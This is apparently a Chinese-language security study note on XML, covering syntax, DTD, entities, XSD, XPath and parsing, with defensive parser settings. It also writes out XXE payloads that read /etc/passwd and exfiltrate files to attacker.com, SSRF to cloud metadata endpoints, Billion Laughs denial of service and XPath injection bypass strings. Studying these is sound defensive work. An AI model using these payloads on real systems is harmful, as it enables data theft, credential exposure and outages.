# XML

> XML（Extensible Markup Language）可扩展标记语言。曾经是数据交换的标准，现在更多用于配置文件（Java/Spring、Android 布局、SOAP 接口）和文档格式（Office 文档内部结构就是 XML）。

---

## 基本语法

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- 这是注释 -->
<bookstore>
    <book category="security">
        <title lang="en">Web Application Hacker's Handbook</title>
        <author>Dafydd Stuttard</author>
        <year>2011</year>
        <price currency="USD">49.99</price>
    </book>
    <book category="security">
        <title lang="en">The Tangled Web</title>
        <author>Michal Zalewski</author>
        <year>2011</year>
    </book>
</bookstore>
```

**核心规则：**

| 规则 | 示例 |
|------|------|
| 必须有根元素 | `<bookstore>` 包裹所有内容 |
| 标签必须闭合 | `<title>...</title>`，自闭合 `<br/>` |
| 大小写敏感 | `<Title>` 和 `<title>` 是不同标签 |
| 属性值必须加引号 | `category="security"` |
| 不能交叉嵌套 | `<a><b></a></b>` 非法 |

**XML 声明属性：**

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
```

| 属性 | 说明 |
|------|------|
| `version` | XML 版本，固定 `1.0` |
| `encoding` | 字符编码，默认 UTF-8 |
| `standalone` | `yes` 表示文档独立（不依赖外部 DTD），`no` 表示可能引用外部资源 |

---

## DTD（Document Type Definition）

DTD 定义 XML 文档的结构规则——允许哪些元素、元素间什么关系、元素可以有什么属性。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE bookstore [
    <!ELEMENT bookstore (book+)>
    <!ELEMENT book (title, author, year, price?)>
    <!ELEMENT title (#PCDATA)>
    <!ELEMENT author (#PCDATA)>
    <!ELEMENT year (#PCDATA)>
    <!ELEMENT price (#PCDATA)>
    <!ATTLIST book category CDATA #REQUIRED>
    <!ATTLIST title lang CDATA #IMPLIED>
    <!ATTLIST price currency CDATA "USD">
]>
<bookstore>
    ...
</bookstore>
```

**DTD 关键字说明：**

| 关键字 | 含义 |
|------|------|
| `#PCDATA` | 可解析的字符数据（Parsed Character Data） |
| `#CDATA` | 字符数据，不做 XML 解析 |
| `#REQUIRED` | 属性必须存在 |
| `#IMPLIED` | 属性可选 |
| `#FIXED` | 固定值，不可更改 |
| `(a, b)` | a 和 b 按顺序出现一次 |
| `(a\|b)` | a 或 b 二选一 |
| `a+` | 至少一次 |
| `a*` | 零次或多次 |
| `a?` | 零次或一次 |

**内部 vs 外部 DTD：**

```xml
<!-- 内部 DTD：写在 XML 文件里 -->
<!DOCTYPE bookstore [
    <!ELEMENT bookstore (book+)>
]>

<!-- 外部 DTD：引用独立文件 -->
<!DOCTYPE bookstore SYSTEM "bookstore.dtd">

<!-- 外部 DTD（公网标识符） -->
<!DOCTYPE bookstore PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN"
    "http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd">
```

---

## 实体（Entity）

实体是 XML 的"变量"——定义一个名字，在文档中通过 `&name;` 引用。

### 实体类型

```xml
<!-- 1. 内部通用实体 -->
<!ENTITY author "Dafydd Stuttard">
<creator>&author;</creator>   <!-- 展开为 Dafydd Stuttard -->

<!-- 2. 外部通用实体（引用外部文件内容） -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- 3. 内部参数实体（只在 DTD 内使用，用 % 引用） -->
<!ENTITY % inner "<!ENTITY injected '来自参数实体'>">
%inner;

<!-- 4. 外部参数实体（引用外部 DTD 文件） -->
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;

<!-- 5. 预定义实体（XML 内置，无需声明） -->
&lt;     <!-- < -->
&gt;     <!-- > -->
&amp;    <!-- & -->
&quot;   <!-- " -->
&apos;   <!-- ' -->
```

**关键区别：通用实体 vs 参数实体：**

| | 通用实体 | 参数实体 |
|---|---|---|
| 定义符号 | `<!ENTITY name ...>` | `<!ENTITY % name ...>` |
| 引用符号 | `&name;` | `%name;` |
| 使用位置 | XML 文档内容中 | 只在 DTD 内部 |
| XXE 中的作用 | 直接读文件，结果嵌入响应 | 构造更复杂的攻击链（Blind XXE） |

---

## CDATA

CDATA 段告诉解析器：这里面的内容不要解析，原样保留。攻击者用 CDATA 包裹二进制数据或特殊字符。

```xml
<data>
    <![CDATA[
        这里的 < > & " ' 都不会被解析
        适合放代码、二进制数据的 base64 编码
    ]]>
</data>
```

在 XXE 中，CDATA 配合外部实体可以绕过"响应中不能包含特殊字符"的限制：

```xml
<!-- 攻击者构造的参数实体（托管在 attacker.com/evil.dtd） -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
```

---

## XXE（XML External Entity）攻击

### 原理

当 XML 解析器开启了外部实体处理，攻击者在 XML 中声明一个指向敏感文件的实体，解析器会读取该文件内容并嵌入到 XML 响应中返回。

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>&xxe;</name>
</user>
<!-- 如果服务器返回解析后的内容，/etc/passwd 的内容就会出现在 <name> 中 -->
```

### XXE 分类

**1. 带内 XXE（In-Band）——结果直接回显**

```xml
<!-- 读取文件，内容直接出现在响应中 -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- PHP 文件用 base64 绕过二进制内容截断 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">

<!-- 如果文件内容包含 < > & 可能中断 XML 解析，用 CDATA 包裹（在外部 DTD 中构造） -->
```

**2. 盲 XXE（Blind / Out-of-Band）——结果不回显，通过外带通道获取**

```xml
<!-- 方法 1：HTTP 外带（攻击者服务器上监听请求） -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY send SYSTEM 'http://attacker.com/?f=%file;'>">
%exfil;
<!-- 然后引用 &send;，文件内容会出现在 URL 参数中 -->

<!-- 方法 2：FTP 外带（防火墙阻断 HTTP 出站但放行 FTP） -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY send SYSTEM 'ftp://attacker.com/%file;'>">

<!-- 方法 3：DNS 外带（限制最严格时使用，数据量小） -->
```

典型的外部 DTD 文件（托管在攻击者服务器）：

```xml
<!-- attacker.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfil;
```

**3. 错误型 XXE——利用错误消息泄露数据**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///不存在的路径/%file;'>">
%eval;
%error;
<!-- 错误消息中会显示文件路径和内容 -->
```

### 常见 Payload

```xml
<!-- 读文件 -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">     <!-- Windows -->

<!-- 读 PHP 源码（php://filter 编码绕过） -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">

<!-- SSRF 到云服务元数据 -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">           <!-- AWS -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">  <!-- GCP -->
<!ENTITY xxe SYSTEM "http://100.100.100.200/latest/meta-data/">            <!-- 阿里云 -->

<!-- 拒绝服务（Billion Laughs Attack / XML Bomb） -->
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!-- lol3 展开约 10^3 个 lol，每层 10 倍增长 → 最终约 10^4 个 lol = 40KB -->
<!-- 继续嵌套到 lol9 可达 10^9 个 lol = 3GB，直接耗尽内存 -->

<!-- 实体引用了自身（递归爆炸） -->
<!ENTITY a "&b;">
<!ENTITY b "&a;">
```

### 防御

```python
# Python — defusedxml（推荐）
from defusedxml.ElementTree import parse
tree = parse("input.xml")

# Python — 标准库禁用外部实体
import xml.etree.ElementTree as ET
parser = ET.XMLParser(resolve_entities=False)  # 关键
tree = ET.parse("input.xml", parser=parser)
```

```java
// Java — 正确配置 DocumentBuilderFactory
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

```php
// PHP — 禁用外部实体加载
libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->loadXML($xml);
```

| 防御层 | 方法 |
|------|------|
| 解析器配置 | 禁用 DOCTYPE、外部实体、参数实体、XInclude |
| 库选择 | Python 用 `defusedxml`，不要用 `lxml` 默认配置 |
| 输入过滤 | 白名单校验 XML 结构，拒绝含 `<!DOCTYPE`、`<!ENTITY` 的输入 |
| WAF | 检测 `SYSTEM`、`PUBLIC`、`file://`、`php://` 等关键词 |

---

## XML 命名空间

解决不同 XML 词汇表中元素名冲突的问题：

```xml
<?xml version="1.0"?>
<bookstore xmlns="http://example.com/bookstore"
           xmlns:html="http://www.w3.org/1999/xhtml">
    <book>
        <title>Security 101</title>
        <html:description>
            <html:p>这是一段 HTML 格式的描述</html:p>
        </html:description>
    </book>
</bookstore>
```

`xmlns` 声明默认命名空间，`xmlns:前缀` 声明带前缀的命名空间。标签 `<html:p>` 属于 XHTML 命名空间，`<title>` 属于 bookstore 命名空间。

---

## XSD（XML Schema Definition）

比 DTD 更强大，本身也是 XML，支持数据类型约束。

```xml
<?xml version="1.0"?>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
    <xs:element name="bookstore">
        <xs:complexType>
            <xs:sequence>
                <xs:element name="book" maxOccurs="unbounded">
                    <xs:complexType>
                        <xs:sequence>
                            <xs:element name="title" type="xs:string"/>
                            <xs:element name="author" type="xs:string"/>
                            <xs:element name="year" type="xs:integer"/>
                        </xs:sequence>
                        <xs:attribute name="category" type="xs:string" use="required"/>
                    </xs:complexType>
                </xs:element>
            </xs:sequence>
        </xs:complexType>
    </xs:element>
</xs:schema>
```

**XSD vs DTD：**

| | DTD | XSD |
|---|---|---|
| 语法 | 非 XML 语法 | XML 语法 |
| 数据类型 | 无（全部文本） | 丰富（string, integer, date, boolean...） |
| 命名空间 | 不支持 | 原生支持 |
| 扩展性 | 弱 | 可通过继承扩展 |
| 安全 | XXE 攻击面 | 无外部实体问题 |

---

## XPath

类似 SQL 对数据库，XPath 是对 XML 的查询语言。

```xml
<!-- 示例 XML -->
<users>
    <user role="admin">
        <name>Alice</name>
        <password>secret123</password>
    </user>
    <user role="user">
        <name>Bob</name>
        <password>password</password>
    </user>
</users>
```

```bash
# 基本路径
/users/user                              # 所有 user 元素
/users/user[1]                           # 第一个 user（从 1 开始计数）
/users/user[@role="admin"]              # role 为 admin 的 user
/users/user/name                         # 所有 name 元素
/users/user[name="Bob"]                  # name 为 Bob 的 user
//name                                   # 文档中任意位置的 name 元素

# 函数
count(//user)                            # user 元素数量
contains(name, "A")                      # name 是否包含 "A"
starts-with(name, "A")                   # name 是否以 "A" 开头
substring(name, 1, 3)                    # 取前三个字符
normalize-space()                        # 去除首尾空白
```

**XPath 注入：** 类似 SQL 注入，攻击者拼接 XPath 语句绕过认证：

```bash
# 正常认证查询
/users/user[name="admin" and password="123456"]

# 注入 payload 1：恒真绕过
admin" or "1"="1
# → /users/user[name="admin" or "1"="1" and password=""]

# 注入 payload 2：截断
admin" or "1"="1" or "
# → /users/user[name="admin" or "1"="1" or "" and password=""]

# 注入 payload 3：盲注猜解
admin" and substring(password,1,1)="s" and "
# 根据返回结果是否为空，逐字符猜解密码
```

---

## XML 解析方式

| 方式 | 说明 | 适用场景 |
|------|------|---------|
| DOM | 一次性加载整个文档到内存，构建树结构 | 小文档、需要随机访问 |
| SAX | 流式读取，事件驱动，读完即丢 | 大文档、内存受限 |
| StAX | 拉式流读取，按需获取下一个元素 | 大文档、需要更多控制 |
| JAXB | Java 的 XML 绑定，直接将 XML 映射为 Java 对象 | Java 生态 |

DOM 解析会把整个文件（包括 XXE payload 展开后的内容）加载到内存，DoS 攻击威力更大。

---

## 常见用途

| 场景 | 示例 |
|------|------|
| SOAP 接口 | Web Service 通信（已逐渐被 REST + JSON 替代） |
| SAML 认证 | 单点登录的身份断言，XML 签名安全至关重要 |
| RSS/Atom | 订阅源 |
| 配置文件 | Java/Spring (`web.xml`, `pom.xml`)、Android (`AndroidManifest.xml`) |
| Office 文档 | `.docx` / `.xlsx` 本质是 zip 包内多个 XML 文件 |
| SVG | 矢量图格式，本质是 XML，可嵌入 `<script>` 导致 XSS |
| WSDL | Web Service 描述文件 |
| WAF/IPS 规则 | ModSecurity、Snort 使用 XML 定义规则 |
